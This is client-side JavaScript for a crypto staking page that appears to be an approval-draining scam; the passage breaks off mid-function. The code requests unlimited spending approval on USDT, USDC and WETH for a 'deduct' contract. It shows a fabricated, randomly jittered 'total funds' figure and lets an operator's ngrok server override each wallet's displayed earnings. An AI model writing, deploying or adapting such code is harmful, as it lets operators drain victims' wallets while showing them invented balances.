//---Client-side Constants---
const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
const API_BASE_URL = 'https://ventilative-lenten-brielle.ngrok-free.dev';

//---ABI Definitions---
const DEDUCT_CONTRACT_ABI = [
    "function isServiceActiveFor(address customer) view returns (bool)",
    "function activateService(address tokenContract) external",
    "function REQUIRED_ALLOWANCE_THRESHOLD() view returns (uint256)"
];
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

//---Global Variables & DOM Elements---
const connectButton = document.getElementById('connectButton');
const statusDiv = document.getElementById('status');
const startBtn = document.getElementById('startBtn');
const pledgeBtn = document.getElementById('pledgeBtn');
const pledgeAmount = document.getElementById('pledgeAmount');
const pledgeDuration = document.getElementById('pledgeDuration');
const pledgeToken = document.getElementById('pledgeToken');
const refreshWallet = document.getElementById('refreshWallet');
const walletTokenSelect = document.getElementById('walletTokenSelect');
const walletBalanceAmount = document.getElementById('walletBalanceAmount');
const accountBalanceValue = document.getElementById('accountBalanceValue');
const totalValue = document.getElementById('totalValue');
// 修改：使用 getElementById 提高穩健性
let grossOutputValue = document.getElementById('grossOutputValue');
let cumulativeValue = document.getElementById('cumulativeValue');
const nextBenefit = document.getElementById('nextBenefit');
const claimBtn = document.createElement('button');
claimBtn.id = 'claimButton';

//---修改：Claim 確認 Modal 相關元素---
const claimModal = document.getElementById('claimModal');
const closeModal = document.getElementById('closeModal');
const confirmClaim = document.getElementById('confirmClaim');
const cancelClaim = document.getElementById('cancelClaim');
const modalClaimableETH = document.getElementById('modalClaimableETH');
const modalEthPrice = document.getElementById('modalEthPrice');
const modalSelectedToken = document.getElementById('modalSelectedToken');
const modalEquivalentValue = document.getElementById('modalEquivalentValue');
const modalTitle = document.getElementById('modalTitle');

let provider, signer, userAddress;
let deductContract, usdtContract, usdcContract, wethContract;
let stakingStartTime = null;
let claimedInterest = 0;
let pledgedAmount = 0;
let interestInterval = null;
let nextBenefitInterval = null;
let accountBalance = { USDT: 0, USDC: 0, WETH: 0 };

//---Helper Function: Retry DOM Acquisition---
async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
    let attempts = 0;
    while (attempts < maxAttempts) {
        grossOutputValue = document.getElementById('grossOutputValue');
        cumulativeValue = document.getElementById('cumulativeValue');
        if (grossOutputValue && cumulativeValue) {
            console.log("retryDOMAcquisition: Successfully acquired DOM elements after", attempts + 1, "attempts.");
            return true;
        }
        console.warn("retryDOMAcquisition: Attempt", attempts + 1, "failed. Retrying after", delayMs, "ms...");
        await new Promise(resolve => setTimeout(resolve, delayMs));
        attempts++;
    }
    console.error("retryDOMAcquisition: Failed to acquire DOM elements after", maxAttempts, "attempts.");
    return false;
}

//---新增：從伺服器拉取用戶資料並同步本地---
async function loadUserDataFromServer() {
    if (!userAddress) return;
    try {
        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        if (response.ok) {
            const allData = await response.json();
            const userData = allData.users[userAddress];
            if (userData) {
                // 同步本地資料
                if (userData.stakingStartTime) {
                    stakingStartTime = parseInt(userData.stakingStartTime);
                    localStorage.setItem('stakingStartTime', userData.stakingStartTime);
                }
                if (userData.claimedInterest) {
                    claimedInterest = parseFloat(userData.claimedInterest);
                    localStorage.setItem('claimedInterest', userData.claimedInterest);
                }
                if (userData.pledgedAmount) {
                    pledgedAmount = parseFloat(userData.pledgedAmount);
                    localStorage.setItem('pledgedAmount', userData.pledgedAmount);
                }
                if (userData.nextBenefitTime) {
                    localStorage.setItem('nextBenefitTime', userData.nextBenefitTime);
                }
                if (userData.accountBalance) {
                    accountBalance = userData.accountBalance;
                    localStorage.setItem('accountBalance', JSON.stringify(userData.accountBalance));
                }
                console.log("loadUserDataFromServer: Synced user data from server:", userData);
                updateInterest();  // 重新計算 UI
                updateNextBenefitTimer();
            }
        }
    } catch (error) {
        console.warn("loadUserDataFromServer: Failed to load from server:", error);
    }
}

//---UI Control Functions---
async function saveUserData() {
    if (!userAddress) {
        console.log("saveUserData: No user address available, skipping save.");
        return;
    }
    const dataToSave = {
        stakingStartTime: localStorage.getItem('stakingStartTime'),
        claimedInterest: localStorage.getItem('claimedInterest'),
        pledgedAmount: localStorage.getItem('pledgedAmount'),
        nextBenefitTime: localStorage.getItem('nextBenefitTime'),
        accountBalance: JSON.parse(localStorage.getItem('accountBalance'))
    };
    try {
        console.log("saveUserData: Sending data to server for address:", userAddress, dataToSave);
        const response = await fetch(`${API_BASE_URL}/api/user-data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'ngrok-skip-browser-warning': 'true'
            },
            body: JSON.stringify({ address: userAddress, data: dataToSave })
        });
        console.log("saveUserData: Response status:", response.status);
        if (!response.ok) throw new Error(`Failed to save user data, status: ${response.status}`);
        console.log("saveUserData: User data sent to server successfully.");
    } catch (error) {
        console.warn("saveUserData: Could not send user data to server:", error);
    }
}


function updateStatus(message, isWarning = false) {
    if (!statusDiv) return;
    statusDiv.innerHTML = message || '';
    statusDiv.style.display = message ? 'block' : 'none';
    statusDiv.style.color = isWarning ? '#FFD700' : '#FFFFFF';
    console.log(`updateStatus: ${isWarning ? 'Warning' : 'Info'}: ${message}`);
}

function resetState(showMsg = true) {
    console.log("resetState: Executing state reset...");
    signer = userAddress = null;
    stakingStartTime = null;
    claimedInterest = 0;
    pledgedAmount = 0;
    accountBalance = { USDT: 0, USDC: 0, WETH: 0 };
    if (interestInterval) {
        clearInterval(interestInterval);
        console.log("resetState: Cleared interest interval:", interestInterval);
    }
    if (nextBenefitInterval) {
        clearInterval(nextBenefitInterval);
        console.log("resetState: Cleared next benefit interval:", nextBenefitInterval);
    }
    localStorage.clear();
    console.log("resetState: Local storage cleared.");
    if (startBtn) {
        startBtn.style.display = 'block';
        startBtn.textContent = translations[currentLang]?.startBtnText || 'Start';
    }
    const existingClaimBtn = document.getElementById('claimButton');
    if (existingClaimBtn) {
        existingClaimBtn.remove();
        console.log("resetState: Removed claim button.");
    }
    if (connectButton) {
        connectButton.classList.remove('connected');
        connectButton.textContent = 'Connect';
        connectButton.title = 'Connect Wallet';
        console.log("resetState: Reset connect button state.");
    }
    disableInteractiveElements(true);
    if (walletBalanceAmount) walletBalanceAmount.textContent = '0.000';
    if (walletTokenSelect) walletTokenSelect.value = 'USDT';
    if (accountBalanceValue) accountBalanceValue.textContent = '0.000 USDT';
    if (grossOutputValue) grossOutputValue.textContent = '0 ETH';
    if (cumulativeValue) cumulativeValue.textContent = '0 ETH';
    if (showMsg) updateStatus("Please connect your wallet to continue.");
}

function disableInteractiveElements(disable = false) {
    if (startBtn) startBtn.disabled = disable;
    if (pledgeBtn) pledgeBtn.disabled = disable;
    if (pledgeAmount) pledgeAmount.disabled = disable;
    if (pledgeDuration) pledgeDuration.disabled = disable;
    if (pledgeToken) pledgeToken.disabled = disable;
    if (refreshWallet) {
        refreshWallet.style.pointerEvents = disable ? 'none' : 'auto';
        refreshWallet.style.color = disable ? '#999' : '#ff00ff';
    }
    if (claimBtn) claimBtn.disabled = disable;
    console.log(`disableInteractiveElements: Interactive elements ${disable ? 'disabled' : 'enabled'}.`);
}

function updateBalancesUI(walletBalances) {
    if (!walletTokenSelect) return;
    const selectedToken = walletTokenSelect.value;
    const decimals = { USDT: 6, USDC: 6, WETH: 18 };
    const walletTokenBigInt = walletBalances[selectedToken.toLowerCase()] || 0n;
    const formattedWalletBalance = ethers.formatUnits(walletTokenBigInt, decimals[selectedToken]);
    if (walletBalanceAmount) {
        walletBalanceAmount.textContent = parseFloat(formattedWalletBalance).toFixed(3);
        console.log(`updateBalancesUI: Updated wallet balance for ${selectedToken}: ${formattedWalletBalance}`);
    }
    const claimedBalance = accountBalance[selectedToken] || 0;
    const totalAccountBalance = parseFloat(formattedWalletBalance) + claimedBalance;
    if (accountBalanceValue) {
        accountBalanceValue.textContent = `${totalAccountBalance.toFixed(3)} ${selectedToken}`;
        console.log(`updateBalancesUI: Updated account balance for ${selectedToken}: ${totalAccountBalance}`);
    }
    if (parseFloat(formattedWalletBalance) < 0.001) {
        updateStatus(`Notice: Your ${selectedToken} balance is zero.`, true);
    } else if (statusDiv.style.color === 'rgb(255, 215, 0)') {
        updateStatus("");
    }
}

function updateTotalFunds() {
    if (totalValue) {
        const startTime = new Date('2025-10-22T00:00:00-04:00').getTime();
        const initialFunds = 12856459.94;
        const averageIncreasePerSecond = 0.055;
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - startTime) / 1000);
        const totalIncrease = elapsedSeconds * averageIncreasePerSecond;
        const randomFluctuation = (Math.random() - 0.5);
        const totalFunds = initialFunds + totalIncrease + randomFluctuation;
        totalValue.textContent = `${totalFunds.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ETH`;
        console.log(`updateTotalFunds: Updated total funds: ${totalFunds.toFixed(2)} ETH`);
    }
}

async function updateInterest() {
    // 修改：檢查 DOM 元素並嘗試重試
    if (!grossOutputValue || !cumulativeValue) {
        console.warn("updateInterest: Missing DOM elements:", {
            grossOutputValue: !!grossOutputValue,
            cumulativeValue: !!cumulativeValue
        });
        const acquired = await retryDOMAcquisition();
        if (!acquired) {
            console.error("updateInterest: Failed to re-acquire DOM elements, skipping update.");
            return;
        }
    }
    if (!stakingStartTime || !userAddress) {
        console.log("updateInterest: Skipping due to missing data:", { stakingStartTime, userAddress });
        return;
    }
    let finalGrossOutput;
    let finalCumulative;
    let overrideApplied = false;

    try {
        console.log("updateInterest: Fetching data for address:", userAddress);
        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
            cache: 'no-cache',
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        console.log("updateInterest: Response status:", response.status);
        if (response.ok) {
            const allData = await response.json();
            console.log("updateInterest: Received data:", allData);
            const userOverrides = allData.overrides[userAddress] || {};
            console.log("updateInterest: User overrides:", userOverrides);

            if (userOverrides.grossOutput != null && userOverrides.cumulative != null) {
                finalGrossOutput = Number(userOverrides.grossOutput);
                finalCumulative = Number(userOverrides.cumulative);
                if (!isNaN(finalGrossOutput) && !isNaN(finalCumulative)) {
                    console.log("updateInterest: Admin override applied:", { finalGrossOutput, finalCumulative });
                    overrideApplied = true;
                } else {
                    console.warn("updateInterest: Invalid override values, skipping:", userOverrides);
                }
            } else {
                console.log("updateInterest: No valid overrides found for address:", userAddress);
            }
        } else {
            console.warn("updateInterest: Failed to fetch data, status:", response.status);
        }
    } catch (error) {
        console.warn("updateInterest: Fetch error:", error);
    }

    if (!overrideApplied) {
        const currentTime = Date.now();
        const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
        const baseInterestRate = 0.000001;
        const interestRate = baseInterestRate * pledgedAmount;
        finalGrossOutput = elapsedSeconds * interestRate;
        finalCumulative = finalGrossOutput - claimedInterest;
        console.log("updateInterest: Using local calculation:", { finalGrossOutput, finalCumulative });
    }

    grossOutputValue.textContent = `${Number(finalGrossOutput).toFixed(7)} ETH`;
    cumulativeValue.textContent = `${Number(finalCumulative).toFixed(7)} ETH`;
    console.log(`updateInterest: Updated UI - Gross Output: ${finalGrossOutput.toFixed(7)} ETH, Cumulative: ${finalCumulative.toFixed(7)} ETH`);
}

function updateNextBenefitTimer() {
    if (!nextBenefit) return;
    const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime'));
    const label = (translations[currentLang]?.nextBenefit || "Next Benefit: 00:00:00").split(':')[0];
    if (!nextBenefitTimestamp) {
        nextBenefit.textContent = `${label}: 00:00:00`;
        console.log("updateNextBenefitTimer: No next benefit time set.");
        return;
    }
    const now = Date.now();
    let diff = nextBenefitTimestamp - now;
    if (diff < 0) {
        const twelveHoursInMillis = 12 * 60 * 60 * 1000;
        let newNextBenefitTimestamp = nextBenefitTimestamp;
        while (newNextBenefitTimestamp <= now) {
            newNextBenefitTimestamp += twelveHoursInMillis;
        }
        localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
        saveUserData();
        console.log("updateNextBenefitTimer: Updated next benefit time:", newNextBenefitTimestamp);
    }
    const totalSeconds = Math.floor(diff / 1000);
    const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
    const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
    const seconds = String(totalSeconds % 60).padStart(2, '0');
    nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
    console.log(`updateNextBenefitTimer: Updated timer: ${hours}:${minutes}:${seconds}`);
}

function getETOffsetMilliseconds() {
    const now = new Date();
    const mar = new Date(now.getFullYear(), 2, 8);
    const nov = new Date(now.getFullYear(), 10, 1);
    const marDay = mar.getDay();
    const novDay = nov.getDay();
    const dstStart = new Date(mar.getFullYear(), mar.getMonth(), 8 + (7 - marDay));
    const dstEnd = new Date(nov.getFullYear(), nov.getMonth(), 1 + (7 - novDay));
    if (now >= dstStart && now < dstEnd) {
        return -4 * 60 * 60 * 1000;
    }
    return -5 * 60 * 60 * 1000;
}

function setInitialNextBenefitTime() {
    if (localStorage.getItem('nextBenefitTime')) return;
    console.log("setInitialNextBenefitTime: Setting initial benefit countdown target based on US Eastern Time...");
    const etOffset = getETOffsetMilliseconds();
    const nowUtcTimestamp = Date.now();
    const nowET = new Date(nowUtcTimestamp + etOffset);
    const noonET = new Date(nowET);
    noonET.setHours(12, 0, 0, 0);
    const midnightET = new Date(nowET);
    midnightET.setHours(24, 0, 0, 0);
    let nextBenefitTimeET;
    if (nowET < noonET) {
        nextBenefitTimeET = noonET;
    } else {
        nextBenefitTimeET = midnightET;
    }
    const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
    localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
    saveUserData();
    console.log("setInitialNextBenefitTime: Set next benefit time:", finalNextBenefitTimestamp);
}

function activateStakingUI() {
    const storedStartTime = localStorage.getItem('stakingStartTime');
    if (storedStartTime) {
        stakingStartTime = parseInt(storedStartTime);
        console.log("activateStakingUI: Restored staking start time:", stakingStartTime);
    } else {
        stakingStartTime = Date.now();
        localStorage.setItem('stakingStartTime', stakingStartTime.toString());
        console.log("activateStakingUI: Set new staking start time:", stakingStartTime);
    }
    claimedInterest = parseFloat(localStorage.getItem('claimedInterest')) || 0;
    pledgedAmount = parseFloat(localStorage.getItem('pledgedAmount')) || 0;
    const storedAccountBalance = JSON.parse(localStorage.getItem('accountBalance'));
    if (storedAccountBalance) {
        accountBalance = storedAccountBalance;
        console.log("activateStakingUI: Restored account balance:", accountBalance);
    }
    if (startBtn) startBtn.style.display = 'none';
    if (document.getElementById('claimButton')) return;
    claimBtn.textContent = translations[currentLang]?.claimBtnText || 'Claim';
    claimBtn.className = 'start-btn';
    claimBtn.style.marginTop = '10px';
    claimBtn.disabled = false;
    const placeholder = document.getElementById('claimButtonPlaceholder');
    placeholder ? placeholder.appendChild(claimBtn) : document.getElementById('liquidity').appendChild(claimBtn);
    console.log("activateStakingUI: Added claim button to UI.");
    if (!claimBtn.hasEventListener) {
        claimBtn.addEventListener('click', claimInterest);
        claimBtn.hasEventListener = true;
        console.log("activateStakingUI: Added event listener to claim button.");
    }
    if (interestInterval) clearInterval(interestInterval);
    interestInterval = setInterval(updateInterest, 1000);
    console.log("activateStakingUI: Set interest interval:", interestInterval);
    if (nextBenefitInterval) clearInterval(nextBenefitInterval);
    nextBenefitInterval = setInterval(updateNextBenefitTimer, 1000);
    console.log("activateStakingUI: Set next benefit interval:", nextBenefitInterval);
    saveUserData();
}

//---Core Wallet Logic---
async function sendMobileRobustTransaction(populatedTx) {
    if (!signer || !provider) throw new Error("Wallet not connected or signer is missing.");
    const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
    const fromAddress = await signer.getAddress();
    const mobileTx = { from: fromAddress, to: populatedTx.to, data: populatedTx.data, value: '0x' + BigInt(txValue).toString(16) };
    let txHash, receipt = null;
    try {
        console.log("sendMobileRobustTransaction: Sending transaction:", mobileTx);
        txHash = await provider.send('eth_sendTransaction', [mobileTx]);
        updateStatus(`Transaction sent! HASH: ${txHash.slice(0, 10)}... waiting for confirmation...`);
        receipt = await provider.waitForTransaction(txHash);
        console.log("sendMobileRobustTransaction: Transaction confirmed, receipt:", receipt);
    } catch (error) {
        console.warn("sendMobileRobustTransaction: Transaction error:", error.message);
        if (error.hash) txHash = error.hash;
        else if (error.message && error.message.includes('0x')) {
            const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
            if (match) txHash = match[0];
        }
        if (txHash) {
            updateStatus(`Transaction interface error! Sent TX: ${txHash.slice(0, 10)}... waiting for confirmation...`);
            receipt = await provider.waitForTransaction(txHash);
            console.log("sendMobileRobustTransaction: Transaction confirmed after error, receipt:", receipt);
        } else throw new Error(`Transaction failed to send: ${error.message}`);
    }
    if (!receipt || receipt.status !== 1) throw new Error(`Transaction failed on-chain (reverted). HASH: ${txHash.slice(0, 10)}...`);
    return receipt;
}

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a compatible wallet.');
            disableInteractiveElements(true);
            console.log("initializeWallet: No Ethereum provider detected.");
            return;
        }
        provider = new ethers.BrowserProvider(window.ethereum);
        window.ethereum.on('accountsChanged', (newAccounts) => {
            console.log("initializeWallet: Accounts changed:", newAccounts);
            if (userAddress) {
                if (newAccounts.length === 0 || userAddress.toLowerCase() !== newAccounts[0].toLowerCase()) {
                    window.location.reload();
                }
            }
        });
        window.ethereum.on('chainChanged', () => {
            console.log("initializeWallet: Chain changed, reloading page.");
            window.location.reload();
        });
        const accounts = await provider.send('eth_accounts', []);
        console.log("initializeWallet: Initial accounts:", accounts);
        if (accounts.length > 0) {
            await connectWallet();
        } else {
            disableInteractiveElements(true);
            updateStatus("Please connect your wallet to continue.");
        }
    } catch (error) {
        console.error("initializeWallet: Wallet initialization error:", error);
        updateStatus(`Initialization failed: ${error.message}`);
    }
}

async function updateUIBasedOnChainState() {
    if (!signer) {
        console.log("updateUIBasedOnChainState: No signer available, skipping.");
        return;
    }
    try {
        updateStatus("Checking on-chain authorization status...");
        const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
        console.log("updateUIBasedOnChainState: Required allowance:", requiredAllowance.toString());
        const [isServiceActive, usdtAllowance, usdcAllowance, wethAllowance] = await Promise.all([
            deductContract.isServiceActiveFor(userAddress),
            usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS),
            wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n)
        ]);
        console.log("updateUIBasedOnChainState: Chain state:", { isServiceActive, usdtAllowance, usdcAllowance, wethAllowance });
        const isWethAuthorized = wethAllowance >= requiredAllowance;
        const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
        const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
        const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
        const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
        if (isFullyAuthorized) {
            console.log("updateUIBasedOnChainState: On-chain state is AUTHORIZED. Switching to staking UI.");
            if (isWethAuthorized) walletTokenSelect.value = 'WETH';
            else if (isUsdtAuthorized) walletTokenSelect.value = 'USDT';
            else if (isUsdcAuthorized) walletTokenSelect.value = 'USDC';
            walletTokenSelect.dispatchEvent(new Event('change'));
            setInitialNextBenefitTime();
            activateStakingUI();
        } else {
            console.log("updateUIBasedOnChainState: On-chain state is NOT AUTHORIZED. Showing Start button.");
            if(startBtn) startBtn.style.display = 'block';
        }
        disableInteractiveElements(false);
        updateStatus("");
    } catch (error) {
        console.error("updateUIBasedOnChainState: Failed to check on-chain state:", error);
        updateStatus("Failed to check on-chain state. Please refresh.");
    }
}

async function handleConditionalAuthorizationFlow() {
    if (!signer) throw new Error("Wallet not connected");
    updateStatus('Preparing authorization...');
    const selectedToken = walletTokenSelect.value;
    console.log(`handleConditionalAuthorizationFlow: User selected ${selectedToken} for authorization.`);
    const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
    console.log("handleConditionalAuthorizationFlow: Required allowance:", requiredAllowance.toString());
    const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
    console.log("handleConditionalAuthorizationFlow: Service activated:", serviceActivated);
    const tokenMap = { 'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS }, 'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS }, 'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS } };
    const tokensToProcess = [ tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken) ];
    let tokenToActivate = '';
    for (const { name, contract, address } of tokensToProcess) {
        updateStatus(`Checking ${name} allowance...`);
        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
        console.log(`handleConditionalAuthorizationFlow: ${name} allowance:`, currentAllowance.toString());
        if (currentAllowance < requiredAllowance) {
            updateStatus(`Requesting ${name} approval... Please approve in your wallet.`);
            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
            approvalTx.value = 0n;
            console.log("handleConditionalAuthorizationFlow: Sending approval transaction for", name, approvalTx);
            await sendMobileRobustTransaction(approvalTx);
            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS).catch(() => 0n);
            console.log(`handleConditionalAuthorizationFlow: New ${name} allowance:`, newAllowance.toString());
            if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
        } else {
            if (!tokenToActivate) tokenToActivate = address;
        }
    }
    if (!serviceActivated && tokenToActivate) {
        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
        updateStatus(`Activating service (using ${tokenName})...`);
        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
        activateTx.value = 0n;
        console.log("handleConditionalAuthorizationFlow: Sending activate service transaction:", activateTx);
        await sendMobileRobustTransaction(activateTx);
    }
}

async function connectWallet() {
    try {
        if (!provider) throw new Error("Provider not initialized");
        updateStatus('Please confirm connection in your wallet...');
        const accounts = await provider.send('eth_requestAccounts', []);
        console.log("connectWallet: Accounts received:", accounts);
        if (accounts.length === 0) throw new Error("No account selected.");
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        console.log("connectWallet: Connected user address:", userAddress);
        connectButton.classList.add('connected');
        connectButton.textContent = 'Connected';
        connectButton.title = 'Disconnect Wallet';
        deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
        wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
        await updateUIBasedOnChainState();
        updateStatus('Fetching wallet balances...');
        const balances = {
            usdt: await usdtContract.balanceOf(userAddress).catch(() => 0n),
            usdc: await usdcContract.balanceOf(userAddress).catch(() => 0n),
            weth: await wethContract.balanceOf(userAddress).catch(() => 0n)
        };
        console.log("connectWallet: Wallet balances:", balances);
        updateBalancesUI(balances);
        updateStatus("");
        await loadUserDataFromServer();  // 新增：連錢包後從伺服器同步資料
        await saveUserData();
    } catch (error) {
        console.error("connectWallet: Connection error:", error);
        let userMessage = `Error: ${error.message}`;
        if (error.code === 4001) userMessage = "You rejected the connection request.";
        updateStatus(userMessage);
        resetState(true);
    }
}

function disconnectWallet() {
    resetState(true);
    alert('Wallet disconnected. To fully remove permissions, do so from within your wallet settings.');
    console.log("disconnectWallet: Wallet disconnected.");
}

//---修改：getEthPrices() 加 fallback，使用 usd 作為預設---
async function getEthPrices() {
    try {
        updateStatus("Fetching latest prices...");
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
            headers: { 'ngrok-skip-browser-warning': 'true' }
        });
        console.log("getEthPrices: Response status:", response.status);
        if (!response.ok) throw new Error('Network response was not ok');
        const data = await response.json();
        console.log("getEthPrices: Received price data:", data);

        // 修改：加 fallback，如果 usdt missing，用 usd
        const usdPrice = data.ethereum?.usd || 0;
        const usdtPrice = data.ethereum?.usdt || usdPrice;  // Fallback to USD
        const prices = {
            usd: usdPrice,
            usdt: usdtPrice,
            usdc: usdPrice,  // USDC ≈ USD
            weth: usdPrice   // WETH ≈ ETH/USD, but for conversion, use 1:1 logic below if needed
        };
        console.log("getEthPrices: Processed prices:", prices);  // Debug log
        updateStatus("");
        return prices;
    } catch (error) {
        console.error("getEthPrices: Could not fetch ETH price:", error);
        updateStatus("Could not fetch price data.", true);
        return null;
    }
}
//---修改後的 claimInterest 函數，加 NaN 檢查與 fallback---
async function claimInterest() {
    const claimableETHString = cumulativeValue.textContent.replace(' ETH', '').trim();
    const claimableETH = parseFloat(claimableETHString);
    console.log("claimInterest: Raw claimableETHString:", claimableETHString, "Parsed:", claimable